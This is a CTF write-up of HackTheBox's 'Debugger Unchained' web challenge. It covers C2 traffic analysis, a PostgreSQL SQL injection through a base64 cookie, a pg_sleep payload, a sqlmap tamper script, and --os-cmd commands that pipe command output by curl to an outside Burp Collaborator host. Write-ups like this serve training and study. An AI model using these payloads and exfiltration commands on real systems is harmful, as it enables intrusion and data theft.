# HTB - Dirty Money - Debugger Unchained Write UP

## Debugger Unchained

This was one of the web apps included in the HackTheBox Business CTF 'Dirty Money'. It was rated as easy and in the unexpected heat of the British summer I managed to turn this into a box that was hard...all will be explained.

There's nothing particularly new in this write up and I've read a few that are much more elegant than my process, but there may be some new or at least different techniques that can be used by others.

## Challenge Description


>Our SOC team has discovered a new strain of malware in one of the workstations. They extracted what looked like a C2 profile from the infected machine's memory and exported a network capture of the C2 traffic for further analysis. To discover the culprits,we need you to study the C2 infrastructure and check for potential weaknesses that can get us access to the server.

### Challenge Files
We were also provided with two additional files;

- c2.profile
- traffic.pcapng

The following shows the contents of the 'c2.profile' file.

```
{
    'sleeptime': 3000,
    'jitter': 5,
    'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edge/44.18363.1337',
    'headers': {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'Cookie': '__cflb=$$UUID$$; __cfuid=$$RECV$$'
    },
    'get_uri': '/assets/jquery-3.6.0.slim.min.js',
    'set_uri': '/assets/jquery-3.6.0.slim.min.js'
}
```

The following screenshots are examples from the 'traffic.pcapng' file.

![Image](https://github.com/sentrium-security/CTF-Write-Ups/blob/main/HTB%20Dirty%20Money/wireshark_1.png)
![Image](https://github.com/sentrium-security/CTF-Write-Ups/blob/main/HTB%20Dirty%20Money/wireshark_2.png)

## The Challenge

From the c2.profile we can see a couple of interesting points.

1.  The cookies ```__cflb=$$UUID$$;``` and ```__cfuid=$$RECV$$```
2.  ```get_uri``` and ```set_uri```

With this in mind, focus moved to the traffic capture. Reviewing the TCP streams, we can start to see intersting points here as well. 

A GET request to '/assets/jquery-3.6.0.slim.min.js' 

```
GET /assets/jquery-3.6.0.slim.min.js HTTP/1.1
Host: cdnjs.cloudflair.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edge/44.18363.1337
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Accept-Language: en-US,en;q=0.5
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Cookie: __cflb=49f062b5-8b94-4fff-bb41-d504b148aa1b;
```

Reading the response to this request, we see a 'task' variable included at the end of the jquery file contents, which contains some standout base64.

```
task="eyJpZCI6IDE4LCAiY21kIjogImQyaHZZVzFwSUM5aGJHdz0ifQ==";
```

Decoding the above reveals the following, with more base64.

```
{"id": 18, "cmd": "d2hvYW1pIC9hbGw="}
```

Once decoded, we see the actual command that was.

```whoami /all```

Following the streams on in Wireshark, we see a POST request is made, this time with the following cookie. Paying attention to the __cfuid value which is more base64.

```
Cookie: __cflb=49f062b5-8b94-4fff-bb41-d504b148aa1b; __cfuid=eyJpZCI6IDE4LCAib3V0cHV0IjogIkNsVlRSVklnU1U1R1QxSk5RVlJKVDA0S0xTMHRMUzB0TFMwdExTMHRMUzB0TFFvS1ZYTmxjaUJPWVcxbElDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdVMGxFSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQW85UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFNBOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOUNtUmxjMnQwYjNBdGNYWXpibkZzYlZ4c1lYSnllU0J6ZEdWMlpXNXpJRk10TVMwMUxUSXhMVEl3TWpreU56Z3lNRGd0TVRnNU9USTJNalV3TmkweU5UTXpPVGc1TlRBM0xURXdNREFLQ2dwSFVrOVZVQ0JKVGtaUFVrMUJWRWxQVGdvdExTMHRMUzB0TFMwdExTMHRMUzB0TFFvS1IzSnZkWEFnVG1GdFpTQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCVWVYQmxJQ0FnSUNBZ0lDQWdJQ0FnSUZOSlJDQWdJQ0FnSUNBZ0lDQkJkSFJ5YVdKMWRHVnpJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUFvOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5SUQwOVBUMDlQVDA5UFQwOVBUMDlQVDBnUFQwOVBUMDlQVDA5UFQwOUlEMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5Q2tWMlpYSjViMjVsSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnVjJWc2JDMXJibTkzYmlCbmNtOTFjQ0JUTFRFdE1TMHdJQ0FnSUNBZ1RXRnVaR0YwYjNKNUlHZHliM1Z3TENCRmJtRmliR1ZrSUdKNUlHUmxabUYxYkhRc0lFVnVZV0pzWldRZ1ozSnZkWEFLVGxRZ1FWVlVTRTlTU1ZSWlhFeHZZMkZzSUdGalkyOTFiblFnWVc1a0lHMWxiV0psY2lCdlppQkJaRzFwYm1semRISmhkRzl5Y3lCbmNtOTFjQ0JYWld4c0xXdHViM2R1SUdkeWIzVndJRk10TVMwMUxURXhOQ0FnSUNCSGNtOTFjQ0IxYzJWa0lHWnZjaUJrWlc1NUlHOXViSGtnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQXBDVlVsTVZFbE9YRUZrYldsdWFYTjBjbUYwYjNKeklDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJRUZzYVdGeklDQWdJQ0FnSUNBZ0lDQWdVeTB4TFRVdE16SXROVFEwSUVkeWIzVndJSFZ6WldRZ1ptOXlJR1JsYm5rZ2IyNXNlU0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdDa0pWU1V4VVNVNWNWWE5sY25NZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdRV3hwWVhNZ0lDQWdJQ0FnSUNBZ0lDQlRMVEV0TlMwek1pMDFORFVnVFdGdVpHRjBiM0o1SUdkeWIzVndMQ0JGYm1GaWJHVmtJR0o1SUdSbFptRjFiSFFzSUVWdVlXSnNaV1FnWjNKdmRYQUtUbFFnUVZWVVNFOVNTVlJaWEVsT1ZFVlNRVU5VU1ZaRklDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQlhaV3hzTFd0dWIzZHVJR2R5YjNWd0lGTXRNUzAxTFRRZ0lDQWdJQ0JOWVc1a1lYUnZjbmtnWjNKdmRYQXNJRVZ1WVdKc1pXUWdZbmtnWkdWbVlYVnNkQ3dnUlc1aFlteGxaQ0JuY205MWNBcERUMDVUVDB4RklFeFBSMDlPSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lGZGxiR3d0YTI1dmQyNGdaM0p2ZFhBZ1V5MHhMVEl0TVNBZ0lDQWdJRTFoYm1SaGRHOXllU0JuY205MWNDd2dSVzVoWW14bFpDQmllU0JrWldaaGRXeDBMQ0JGYm1GaWJHVmtJR2R5YjNWd0NrNVVJRUZWVkVoUFVrbFVXVnhCZFhSb1pXNTBhV05oZEdWa0lGVnpaWEp6SUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1YyVnNiQzFyYm05M2JpQm5jbTkxY0NCVExURXROUzB4TVNBZ0lDQWdUV0Z1WkdGMGIzSjVJR2R5YjNWd0xDQkZibUZpYkdWa0lHSjVJR1JsWm1GMWJIUXNJRVZ1WVdKc1pXUWdaM0p2ZFhBS1RsUWdRVlZVU0U5U1NWUlpYRlJvYVhNZ1QzSm5ZVzVwZW1GMGFXOXVJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCWFpXeHNMV3R1YjNkdUlHZHliM1Z3SUZNdE1TMDFMVEUxSUNBZ0lDQk5ZVzVrWVhSdmNua2daM0p2ZFhBc0lFVnVZV0pzWldRZ1lua2daR1ZtWVhWc2RDd2dSVzVoWW14bFpDQm5jbTkxY0FwT1ZDQkJWVlJJVDFKSlZGbGNURzlqWVd3Z1lXTmpiM1Z1ZENBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUZkbGJHd3RhMjV2ZDI0Z1ozSnZkWEFnVXkweExUVXRNVEV6SUNBZ0lFMWhibVJoZEc5eWVTQm5jbTkxY0N3Z1JXNWhZbXhsWkNCaWVTQmtaV1poZFd4MExDQkZibUZpYkdWa0lHZHliM1Z3Q2t4UFEwRk1JQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnVjJWc2JDMXJibTkzYmlCbmNtOTFjQ0JUTFRFdE1pMHdJQ0FnSUNBZ1RXRnVaR0YwYjNKNUlHZHliM1Z3TENCRmJtRmliR1ZrSUdKNUlHUmxabUYxYkhRc0lFVnVZV0pzWldRZ1ozSnZkWEFLVGxRZ1FWVlVTRTlTU1ZSWlhFNVVURTBnUVhWMGFHVnVkR2xqWVhScGIyNGdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JYWld4c0xXdHViM2R1SUdkeWIzVndJRk10TVMwMUxUWTBMVEV3SUNCTllXNWtZWFJ2Y25rZ1ozSnZkWEFzSUVWdVlXSnNaV1FnWW5rZ1pHVm1ZWFZzZEN3Z1JXNWhZbXhsWkNCbmNtOTFjQXBOWVc1a1lYUnZjbmtnVEdGaVpXeGNUV1ZrYVhWdElFMWhibVJoZEc5eWVTQk1aWFpsYkNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJRXhoWW1Wc0lDQWdJQ0FnSUNBZ0lDQWdVeTB4TFRFMkxUZ3hPVElnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdDZ29LVUZKSlZrbE1SVWRGVXlCSlRrWlBVazFCVkVsUFRnb3RMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0Q2dwUWNtbDJhV3hsWjJVZ1RtRnRaU0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQkVaWE5qY21sd2RHbHZiaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdVM1JoZEdVZ0lDQUtQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDBnUFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5SUQwOVBUMDlQVDA5Q2xObFUyaDFkR1J2ZDI1UWNtbDJhV3hsWjJVZ0lDQWdJQ0FnSUNBZ0lGTm9kWFFnWkc5M2JpQjBhR1VnYzNsemRHVnRJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQkVhWE5oWW14bFpBcFRaVU5vWVc1blpVNXZkR2xtZVZCeWFYWnBiR1ZuWlNBZ0lDQWdJQ0JDZVhCaGMzTWdkSEpoZG1WeWMyVWdZMmhsWTJ0cGJtY2dJQ0FnSUNBZ0lDQWdJQ0FnUlc1aFlteGxaQ0FLVTJWVmJtUnZZMnRRY21sMmFXeGxaMlVnSUNBZ0lDQWdJQ0FnSUNBZ1VtVnRiM1psSUdOdmJYQjFkR1Z5SUdaeWIyMGdaRzlqYTJsdVp5QnpkR0YwYVc5dUlFUnBjMkZpYkdWa0NsTmxTVzVqY21WaGMyVlhiM0pyYVc1blUyVjBVSEpwZG1sc1pXZGxJRWx1WTNKbFlYTmxJR0VnY0hKdlkyVnpjeUIzYjNKcmFXNW5JSE5sZENBZ0lDQWdJQ0JFYVhOaFlteGxaQXBUWlZScGJXVmFiMjVsVUhKcGRtbHNaV2RsSUNBZ0lDQWdJQ0FnSUNCRGFHRnVaMlVnZEdobElIUnBiV1VnZW05dVpTQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1JHbHpZV0pzWldRSyJ9
```

Once again we go through the process of decoding the values until we finally retrieve the output of the ```whoami /all``` command we saw previously. (This is where I should have been paying more attention)


```
USER INFORMATION
----------------

User Name                     SID                                           
============================= ==============================================
desktop-qv3nqlm\larry stevens S-1-5-21-2029278208-1899262506-2533989507-1000
<REDACTED>
```

Continuing through the capture, we also see another interesting piece of information. On one of the POST requests, we see a 500 Internal Server Error which reveals some important info to us.

```
HTTP/1.1 500 INTERNAL SERVER ERROR
Server: Werkzeug/2.1.2 Python/3.8.13
Date: Fri, 24 Jun 2022 17:05:45 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 18904
Connection: close

<!doctype html>
<html lang=en>
  <head>
    <title>psycopg2.errors.UniqueViolation: duplicate key value violates unique constraint "task_outputs_task_id_key"
DETAIL:  Key (task_id)=(20) already exists.
<REDACTED>
  File "/app/application/models/bot.py", line 130, in saveTaskResp
    db.execute(f"""INSERT INTO task_outputs(task_id, output) VALUES ('{id}', '{output}')""")
```

1.  We see the 'psycopg2' library which is a 'PostgreSQL adapter for Python'
2.  We also see the following INSERT INTO statement which appears to be vulnerable to SQL injection and we also know that we're dealing with a PostgreSQL database.

### Exploitation

This is where things take a turn. First I started to work on a payload to demonstrate that we were indeed querying a PostgreSQL database and that if that was true, the query would cause a sleep of 10 seconds. The following was put together.

We take a substring of the version() and match the first 10 characters of it to 'PostgreSQL' and sleep for 10 seconds if true.

```
{"id": "400); SELECT case when (SELECT substr(version(),1,10))=$$PostgreSQL$$ then pg_sleep(10) end;--+-","output":1}
```

Before sending this to the server though, we must remember to base64 the payload. Resulting in the following POST request.

```
POST /assets/jquery-3.6.0.slim.min.js HTTP/1.1
Host: cdnjs.cloudflair.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edge/44.18363.1337
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Accept-Language: en-US,en;q=0.5
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Cookie: __cflb=49f062b5-8b94-4fff-bb41-d504b1481337; __cfuid=eyJpZCI6ICI0MDApOyBTRUxFQ1QgY2FzZSB3aGVuIChTRUxFQ1Qgc3Vic3RyKHZlcnNpb24oKSwxLDEwKSk9JCRQb3N0Z3JlU1FMJCQgdGhlbiBwZ19zbGVlcCgxMCkgZW5kOy0tKy0iLCJvdXRwdXQiOjF9
Content-Length: 0
```

This did indeed cause the execution to pause for 10 seconds and I received the response after said seconds. Perfect, we're away...
I spent far too long trying gain code execution using all the known methods, I won't bore you with all my time wasting. So I turned to SQLmap, knowing that this wouldn't be a simple payload to deal with. First we need to inject into the cookie, no problem, we also have to base64 encode the payload, a little trickier and finally deal with the issue we saw earlier, duplicate key violations.

So, a tamper script was in order and after MUCH trial and error, the following script was what I finally ended up with. Now, please don't judge me on my method of getting around the duplicate key violation, as I said, it was hot, it was late and I was tired.

```
import base64
from urllib.parse import quote
from numpy import random

def tamper(payload, **kwargs):
    params = '{"id": "%s); %s--+-","output":1}' % (random.randint(1000000), payload)
    data = params
    data = base64.b64encode(data.encode('ascii'))
    return data.decode('utf-8')
```

What we basically have here, is a script that will create the JSON payload we require (It will replace the id with a a random int anywhere between 0 and 1000000 - I asked you not to judge me), base64 encode and return the payload for us. We can then use the script in the following fashion. Note that I'd already let it run without the --os-cmd flag to ensure that SQLmap could identify the vulnerabilty.

```
sqlmap -r req.req --data "*" --method POST --tamper tamper.py --dbms PostgreSQL --level 5 --risk 3 --os-cmd "ls -la | curl -H 'Content-Type: application/json' -X POST --data-binary @- http://r7z5rbdnaaq2ecne5ncjyvp9p0vvjk.o
astify.com" --proxy=http://127.0.0.1:8080
```

The 'req.req' file is simply the POST request we used before, however the custom injection point was placed on the cookie.

````
Cookie: __cflb=49f062b5-8b94-4fff-bb41-d504b1481337; __cfuid=*
````

And thankfully, I recevieved the output from the 'ls -la' command as this was posted via curl to a Burp collaborator server.

![Image](https://github.com/sentrium-security/CTF-Write-Ups/blob/main/HTB%20Dirty%20Money/Burp_1.png)

After a bit more enumeration, a readfile binary was in the root directory, so again, I executed the binary and sent the output to Burp collaborator.

```
sqlmap -r req.req --data "*" --method POST --tamper tamper.py --dbms PostgreSQL --level 5 --risk 3 --os-cmd "/readflag | curl -H 'Content-Type: application/json' -X POST --data-binary @- http://r7z5rbdnaaq2ecne5ncjyvp9p0vvj
k.oastify.com" --proxy=http://127.0.0.1:8080
```

And finally the flag was retrieved.

![Image](https://github.com/sentrium-security/CTF-Write-Ups/blob/main/HTB%20Dirty%20Money/Burp_2.png)

# Final Thoughts

As much as I got frustrated by this challenge and I feel like I completely over engineered the process, I really enjoyed this one deep down. Hopefully the tamper script will come in use again in future or someone else can utilise it as well.


James Drew

@sentriumsec

[Sentrium Security](https://sentrium.co.uk)

